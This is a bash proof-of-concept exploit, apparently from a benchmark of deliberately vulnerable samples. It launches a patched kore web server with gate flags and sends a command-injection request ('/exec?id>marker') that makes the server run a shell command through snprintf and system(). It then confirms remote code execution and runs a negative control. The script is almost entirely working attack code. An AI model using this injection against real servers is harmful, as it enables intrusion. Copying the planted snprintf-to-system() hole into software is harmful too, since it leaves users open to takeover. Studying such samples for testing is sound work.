#!/usr/bin/env bash
# PoC for 068_kore_C2I2S3
# Axes: C2 (struct with two fields, two flags) / I2 (snprintf buffer then system()) / S3 (config-gated strict check; bypass by omitting strict mode)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (kore) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/kore"
WWWROOT="/tmp/poc_068_www"
MARKER="/tmp/poc_068_marker"
PORT=18068
NEG_PORT=19068

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" /tmp/poc_068_kore.conf /tmp/poc_068_neg.conf
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# Write config file
cat > /tmp/poc_068_kore.conf << CONFEOF
server notls {
	bind 0.0.0.0 ${PORT}
	tls no
}

workers 1

domain * {
	attach notls

	route /exec {
		handler exec_page
		methods get
	}
}
CONFEOF

# ── start server with gate flags (-E -F) ──────────────────────────
echo "[*] starting kore with -E -F on port $PORT..."
"$BINARY" -c /tmp/poc_068_kore.conf -n -r -E -F &
SERVER_PID=$!
sleep 1

# ── trigger ──────────────────────────────────────────────────────────
# S3: strict mode is off by default; no bypass needed
echo "[*] sending payload..."
curl -sf "http://127.0.0.1:${PORT}/exec?id>${MARKER}" > /dev/null

# ── verify ───────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: without gate flags ─────────────────────────────
echo "[*] verifying gate: endpoint must return 403 without both flags -E -F..."
cat > /tmp/poc_068_neg.conf << CONFEOF
server notls {
	bind 0.0.0.0 ${NEG_PORT}
	tls no
}

workers 1

domain * {
	attach notls

	route /exec {
		handler exec_page
		methods get
	}
}
CONFEOF
"$BINARY" -c /tmp/poc_068_neg.conf -n -r &
NEG_PID=$!
sleep 1
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?id" || true)
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null
if [[ "$HTTP_CODE" == "403" ]]; then
    echo "[+] gate check passed: got 403 without both flags -E -F"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
